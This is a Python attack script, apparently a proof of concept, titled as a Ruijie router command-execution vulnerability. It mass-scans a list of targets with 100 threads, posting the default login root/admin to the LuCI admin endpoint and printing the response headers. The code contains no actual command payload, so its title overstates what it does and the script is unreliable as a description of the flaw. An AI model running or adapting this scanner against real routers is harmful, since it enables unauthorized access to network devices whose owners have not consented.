# 锐捷Ruijie路由器命令执行漏洞
import requests,json,sys,argparse
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
██████╗ ██╗   ██╗██╗     ██╗██╗███████╗    ██████╗  ██████╗███████╗
██╔══██╗██║   ██║██║     ██║██║██╔════╝    ██╔══██╗██╔════╝██╔════╝
██████╔╝██║   ██║██║     ██║██║█████╗█████╗██████╔╝██║     █████╗  
██╔══██╗██║   ██║██║██   ██║██║██╔══╝╚════╝██╔══██╗██║     ██╔══╝  
██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗    ██║  ██║╚██████╗███████╗
╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                                   
                                    author:果冻
"""
    colored_color = colored(test, 'blue')
    print(colored_color)

def main():
    banner()
    parser = argparse.ArgumentParser(description='锐捷Ruijie路由器命令执行漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    proxy = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    api_payload = '/cgi-bin/luci/admin'
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/116.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip,deflate',
        'Content-Type':'application/x-www-form-urlencoded',
        'Content-Length':'38',
        'Origin':f'{target}',
        'Connection':'close',
        'Referer':f'{target}/cgi-bin/luci',
        'Upgrade-Insecure-Requests':'1',
    }
    data = 'luci_username=root&luci_password=admin'
    session = requests.session()
    try:
        res1 = session.post(url=target+api_payload,headers=headers,data=data,verify=False,proxies=proxy)
        print(res1.headers)
        # print(res1.headers)
        # print(res1.content)
    except Exception as e:
        pass
    

if __name__ == '__main__':
    main()